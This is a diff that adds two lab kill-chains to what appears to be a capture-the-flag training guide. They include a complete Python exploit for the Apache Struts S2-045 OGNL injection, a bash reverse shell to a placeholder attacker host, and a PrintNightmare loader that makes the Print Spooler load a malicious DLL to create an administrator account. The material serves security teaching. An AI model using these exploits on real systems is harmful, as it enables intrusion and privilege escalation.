@@ -1915,7 +1915,386 @@ cat /root/flag.txt
 
 ---
 
-<!-- CVE-03..04 kill-chains appended by Plan 03 -->
+### CVE-03: Apache Struts S2-045 — CVE-2017-5638
+
+**VMs:** Attacker (Kali), Victim (Ubuntu — piesecurity/apache-struts2-cve-2017-5638, port 8080)
+**Difficulty:** Medium
+**Flags:** 1
+
+The Apache Struts 2 Jakarta multipart parser fails to validate the `Content-Type` HTTP header before passing it to the OGNL expression evaluator — an attacker can embed a full OGNL expression in that header and force the application server to execute arbitrary OS commands on every multipart POST request. This is the vulnerability at the center of the 2017 Equifax breach (CVE-2017-5638); the victim image ships the exact vulnerable Struts 2.3.12 build.
+
+**No scaffold provided.** The student authors the complete exploit script (~15–25 lines of Python 3), sending a single crafted HTTP POST request with the OGNL payload embedded in the `Content-Type` header. No helper library beyond `requests` is required — the entire exploit fits in one function.
+
+---
+
+#### Stage 1: Service Discovery and Struts Fingerprinting
+
+**Action:** You scan the victim and probe the Struts2 application endpoint to confirm the service is reachable and identify the vulnerable URL path.
+
+**Command:**
+```bash
+nmap -sV -p 8080 VICTIM_IP
+
+# Confirm the Struts2 app responds
+curl -s -o /dev/null -w "%{http_code}" http://VICTIM_IP:8080/showcase.action
+```
+
+**Expected Output:**
+```
+8080/tcp open  http-proxy Apache Tomcat/Coyote JSP engine 1.1
+
+200
+```
+
+**TTP:** [T1046 — Network Service Discovery](https://attack.mitre.org/techniques/T1046/) · Discovery
+
+---
+
+#### Stage 2: OGNL Injection and Command Execution
+
+**Action:** You author the Python 3 exploit script that embeds an OGNL expression in the `Content-Type` header and sends it to `/showcase.action`, executing an arbitrary OS command on the victim and printing the output from the HTTP response body.
+
+**Command:**
+```python
+#!/usr/bin/env python3
+# struts_exploit.py — CVE-2017-5638 S2-045
+# Usage: python3 struts_exploit.py TARGET_URL COMMAND
+
+import requests
+import sys
+
+def exploit(url, cmd):
+    ognl = (
+        "%{(#_='multipart/form-data')."
+        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+        "(#_memberAccess?"
+        "(#_memberAccess=#dm):"
+        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+        "(#ognlUtil.getExcludedPackageNames().clear())."
+        "(#ognlUtil.getExcludedClasses().clear())."
+        "(#context.setMemberAccess(#dm))))."
+        f"(#cmd='{cmd}')."
+        "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+        "(#cmds=(#iswin?new java.lang.String[]{\"cmd.exe\",\"/c\",#cmd}:"
+        "new java.lang.String[]{\"/bin/bash\",\"-c\",#cmd}))."
+        "(#p=new java.lang.ProcessBuilder(#cmds))."
+        "(#p.redirectErrorStream(true)).(#process=#p.start())."
+        "(#ros=(@org.apache.commons.io.IOUtils@toString(#process.getInputStream())))."
+        "(#ros)}"
+    )
+    headers = {"Content-Type": ognl}
+    response = requests.post(url, headers=headers)
+    return response.text
+
+if __name__ == "__main__":
+    url = sys.argv[1]
+    cmd = sys.argv[2]
+    print(exploit(url, cmd))
+```
+
+```bash
+python3 struts_exploit.py http://VICTIM_IP:8080/showcase.action "id"
+```
+
+> **Python 2 vs Python 3 warning:** Most public S2-045 PoC scripts on GitHub were written in 2017 using Python 2 (`urllib2`, `httplib`). These fail immediately on Kali's default Python 3 with `ImportError: No module named 'urllib2'`. Always run the student-authored exploit with `python3 struts_exploit.py`, not `python` or `python2`.
+
+**Expected Output:**
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+**TTP:** [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) · Initial Access
+
+---
+
+#### Stage 3: Reverse Shell Execution
+
+**Action:** You modify the exploit command argument to a bash reverse shell one-liner, sending the request again to upgrade from single-command RCE to an interactive shell on the victim.
+
+**Command:**
+```bash
+python3 struts_exploit.py http://VICTIM_IP:8080/showcase.action \
+  "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"
+```
+
+**Expected Output:**
+```
+(no output in this terminal — connection attempt made; shell appears on listener)
+```
+
+**TTP:** [T1059.004 — Unix Shell](https://attack.mitre.org/techniques/T1059/004/) · Execution
+
+---
+
+#### Stage 4: Reverse Shell Receipt
+
+**Action:** You catch the reverse shell on your netcat listener, confirming interactive command execution on the victim container.
+
+**Command:**
+```bash
+# Run this BEFORE Stage 3 — start the listener first
+nc -lvnp ATTACKER_PORT
+
+# After shell lands — verify identity
+id
+hostname
+```
+
+**Expected Output:**
+```
+Listening on [0.0.0.0] ATTACKER_PORT
+Connection received on VICTIM_IP [random port]
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# hostname
+struts-cve
+```
+
+**TTP:** [T1059.004 — Unix Shell](https://attack.mitre.org/techniques/T1059/004/) · Execution
+
+---
+
+### [FLAG 1] Stage 5: Flag Capture — Container Filesystem
+
+**Action:** You retrieve Flag 1 from the victim container's filesystem using the reverse shell.
+
+**Command:**
+```bash
+find / -name "flag.txt" 2>/dev/null
+cat /root/flag.txt
+```
+
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+
+**TTP:** — (flag capture, not an adversarial technique)
+
+---
+
+### CVE-04: PrintNightmare LPE — CVE-2021-34527
+
+**VMs:** Attacker (Kali), Victim (Windows Server 2019, unpatched pre-July 2021, Print Spooler enabled)
+**Difficulty:** Medium
+**Flags:** 1
+
+PrintNightmare exploits the Windows Print Spooler service (`spoolsv.exe`), which runs as SYSTEM, by calling `AddPrinterDriverEx` over the MS-RPRN named pipe with a `DRIVER_INFO_2` structure that points to a malicious DLL — the Spooler loads the DLL with full SYSTEM privileges, enabling local privilege escalation from any low-privileged interactive account. This kill-chain covers the **LPE path only**: the student begins with an existing low-privileged session on the victim (pre-opened WinRM or RDP foothold) and escalates to SYSTEM.
+
+**Pre-staged on attacker VM:** `add_user.dll` — a compiled malicious DLL that, when loaded by the Spooler, creates a new local administrator account (`ADMIN_ACCOUNT_NAME`) via `net user / net localgroup`. The DLL account name is instructor-defined; the kill-chain uses the `ADMIN_ACCOUNT_NAME` placeholder throughout.
+
+**Student authors (~30–50 lines):** the exploit loader script (`printnightmare_lpe.py`) that calls `AddPrinterDriverEx` over Impacket's `dcerpc.v5.rprn` interface to make the SYSTEM Spooler service load the pre-staged DLL. Learning focus: Windows Print Spooler RPC abuse and privilege escalation mechanics, not DLL authorship.
+
+---
+
+#### Stage 1: Impacket rprn Pre-flight and Foothold Verification
+
+**Action:** You verify that Impacket's `rprn` module is available (required for the exploit loader) and confirm your starting low-privileged foothold on the victim.
+
+**Command:**
+```bash
+# On the attacker Kali VM — verify Impacket rprn import
+python3 -c "from impacket.dcerpc.v5 import rprn; print('OK')"
+
+# Confirm foothold — run from your WinRM or RDP session on the victim:
+whoami
+whoami /priv
+```
+
+**Expected Output:**
+```
+OK
+
+VICTIM_HOSTNAME\lowprivuser
+...
+SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
+```
+
+> **Impacket version warning:** The `rprn` module is present in Impacket 0.13.1+. If you see `ImportError: cannot import name 'rprn' from 'impacket.dcerpc.v5'`, your Kali's packaged Impacket is outdated. Fix with: `pip3 install --upgrade impacket` or verify with `apt-get install -y python3-impacket` on the latest Kali.
+
+**TTP:** — (pre-flight check / configuration step, not an adversarial technique)
+
+---
+
+#### Stage 2: Print Spooler Service Verification
+
+**Action:** You confirm the Print Spooler service (`spoolsv.exe`) is running on the victim, which is the prerequisite for the LPE exploit.
+
+**Command:**
+```bash
+# From your foothold session on the victim (PowerShell or cmd)
+sc query spooler
+
+# Alternative: PowerShell
+Get-Service -Name Spooler | Select-Object Status, StartType
+```
+
+**Expected Output:**
+```
+SERVICE_NAME: spooler
+        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
+        STATE              : 4  RUNNING
+```
+
+**TTP:** [T1046 — Network Service Discovery](https://attack.mitre.org/techniques/T1046/) · Discovery
+
+---
+
+#### Stage 3: DLL Staging Verification
+
+**Action:** You confirm the pre-staged malicious DLL (`add_user.dll`) is accessible at a UNC path reachable by the Spooler service running as SYSTEM, and note the `ADMIN_ACCOUNT_NAME` the DLL will create on execution.
+
+**Command:**
+```bash
+# Verify the DLL is present on the victim (or on an SMB share accessible to SYSTEM)
+# Run from your foothold session on the victim:
+dir C:\Windows\Temp\add_user.dll
+
+# Note: the DLL creates account ADMIN_ACCOUNT_NAME — confirm with your instructor
+# The kill-chain uses ADMIN_ACCOUNT_NAME as the placeholder throughout
+```
+
+**Expected Output:**
+```
+ Volume in drive C has no label.
+
+03/07/2021  10:00 AM            10,752 add_user.dll
+```
+
+**TTP:** — (pre-flight check / configuration step, not an adversarial technique)
+
+---
+
+#### Stage 4: Exploit Loader Execution
+
+**Action:** You execute the student-authored Python exploit loader that calls `AddPrinterDriverEx` over Impacket's `dcerpc.v5.rprn` interface, causing the SYSTEM Spooler service to load the pre-staged DLL and create the new administrator account.
+
+**Command:**
+```python
+#!/usr/bin/env python3
+# printnightmare_lpe.py — CVE-2021-34527 LPE via MS-RPRN AddPrinterDriverEx
+# Requires: Impacket 0.13.1+ (from impacket.dcerpc.v5 import rprn)
+# Usage: python3 printnightmare_lpe.py VICTIM_IP DLL_PATH
+# Run from a low-privileged foothold session on VICTIM_IP, or via WinRM.
+
+from impacket.dcerpc.v5 import transport, rprn
+from impacket.dcerpc.v5.dtypes import NULL
+import sys
+
+def exploit(target, dll_path):
+    # 1. Connect to Print Spooler over ncacn_np named pipe
+    stringbinding = f'ncacn_np:{target}[\\pipe\\spoolss]'
+    rpctransport = transport.DCERPCTransportFactory(stringbinding)
+    dce = rpctransport.get_dce_rpc()
+    dce.connect()
+    dce.bind(rprn.MSRPC_UUID_RPRN)
+    print(f'[*] Connected to {target} via MS-RPRN')
+
+    # 2. Open a printer handle
+    handle = rprn.hRpcOpenPrinter(dce, f'\\\\{target}')['pHandle']
+    print(f'[*] Printer handle obtained')
+
+    # 3. Build DRIVER_INFO_2 struct pointing to the malicious DLL
+    driver_info = rprn.DRIVER_INFO_2()
+    driver_info['cVersion'] = 3
+    driver_info['pName'] = "Legitimate Printer Driver\x00"
+    driver_info['pEnvironment'] = "Windows x64\x00"
+    driver_info['pDriverPath'] = dll_path + "\x00"   # path to pre-staged DLL
+    driver_info['pDataFile'] = dll_path + "\x00"
+    driver_info['pConfigFile'] = dll_path + "\x00"
+
+    # 4. Call AddPrinterDriverEx — Spooler loads DLL as SYSTEM
+    rprn.hRpcAddPrinterDriverEx(dce, NULL, driver_info, dwFileCopyFlags=0x10)
+    print(f'[*] AddPrinterDriverEx called — DLL load triggered')
+
+if __name__ == "__main__":
+    target  = sys.argv[1]   # VICTIM_IP
+    dll_path = sys.argv[2]  # path to add_user.dll on victim (e.g., C:\Windows\Temp\add_user.dll)
+    exploit(target, dll_path)
+```
+
+```bash
+python3 printnightmare_lpe.py VICTIM_IP "C:\\Windows\\Temp\\add_user.dll"
+```
+
+**Expected Output:**
+```
+[*] Connected to VICTIM_IP via MS-RPRN
+[*] Printer handle obtained
+[*] AddPrinterDriverEx called — DLL load triggered
+```
+
+**TTP:** [T1068 — Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/) · Privilege Escalation · [T1055 — Process Injection](https://attack.mitre.org/techniques/T1055/) · Defense Evasion
+
+---
+
+#### Stage 5: Privilege Verification
+
+**Action:** You confirm that the Spooler loaded the DLL as SYSTEM by verifying the new local administrator account (`ADMIN_ACCOUNT_NAME`) was created on the victim.
+
+**Command:**
+```bash
+# From your foothold session on the victim (PowerShell or cmd):
+net user ADMIN_ACCOUNT_NAME
+
+# Alternative: check local Administrators group membership
+net localgroup Administrators
+```
+
+**Expected Output:**
+```
+User name                    ADMIN_ACCOUNT_NAME
+...
+Local Group Memberships      *Administrators
+```
+
+**TTP:** [T1136.001 — Local Account](https://attack.mitre.org/techniques/T1136/001/) · Persistence
+
+---
+
+#### Stage 6: Escalated Access via New Administrator Account
+
+**Action:** You log in as `ADMIN_ACCOUNT_NAME` using the credential set by the pre-staged DLL, confirming SYSTEM-level privilege escalation and access to administrator-only resources.
+
+**Command:**
+```bash
+# From the attacker Kali VM — open a WinRM shell as the new admin account
+evil-winrm -i VICTIM_IP -u ADMIN_ACCOUNT_NAME -p ADMIN_PASSWORD
+
+# Alternative: via Impacket psexec
+python3 /usr/share/doc/python3-impacket/examples/psexec.py \
+  ADMIN_ACCOUNT_NAME:ADMIN_PASSWORD@VICTIM_IP
+```
+
+**Expected Output:**
+```
+*Evil-WinRM* PS C:\Users\ADMIN_ACCOUNT_NAME\Documents>
+whoami
+victim_hostname\ADMIN_ACCOUNT_NAME
+```
+
+**TTP:** [T1078 — Valid Accounts](https://attack.mitre.org/techniques/T1078/) · Initial Access · Defense Evasion
+
+---
+
+### [FLAG 1] Stage 7: Flag Capture — Administrator-Only Location
+
+**Action:** You retrieve Flag 1 from a location accessible only to local administrators or SYSTEM, confirming successful privilege escalation.
+
+**Command:**
+```bash
+# From the evil-winrm or psexec session as ADMIN_ACCOUNT_NAME:
+type C:\Users\Administrator\Desktop\flag.txt
+
+# Alternative:
+Get-Content "C:\Users\Administrator\Desktop\flag.txt"
+```
+
+**Expected Output:** `CTF{...flag_value_placeholder...}`
+
+**TTP:** — (flag capture, not an adversarial technique)
+
+---
+
+<!-- CC-01..03 kill-chains appended by Plan 04 -->
 
 ---
 
@@ -1955,4 +2334,11 @@ The following checklist was applied before finalizing this document:
 | Phase 3: CVE-01 and CVE-02 each contain exactly one `### [FLAG 1]` stage | PASS |
 | Phase 3: CVE-02 uses `X-Api-Version` header and `${jndi:ldap://...}` payload shape | PASS |
 | Phase 3: CVE-02 references `SearchResultReference` as the student-authored referral response | PASS |
+| Phase 3: CVE-03 kill-chain references Struts S2-045 (CVE-2017-5638), not Spring4Shell | PASS |
+| Phase 3: CVE-03 has no scaffold — student authors full ~15–25 line Python 3 OGNL exploit (D-03) | PASS |
+| Phase 3: CVE-03 contains no Spring4Shell/CVE-2022-22965/AccessLogValve residue | PASS |
+| Phase 3: CVE-04 discloses pre-staged DLL vs student-authored loader boundary (D-04) | PASS |
+| Phase 3: CVE-04 uses ADMIN_ACCOUNT_NAME placeholder — no hardcoded account name | PASS |
+| Phase 3: CVE-04 pre-flight includes `from impacket.dcerpc.v5 import rprn` import check | PASS |
+| Phase 3: CVE-03 and CVE-04 each contain exactly one `### [FLAG 1]` stage | PASS |
 | Phase 3: CVE-02 cites JDK 1.8.0_181 constraint in inline warning | PASS |
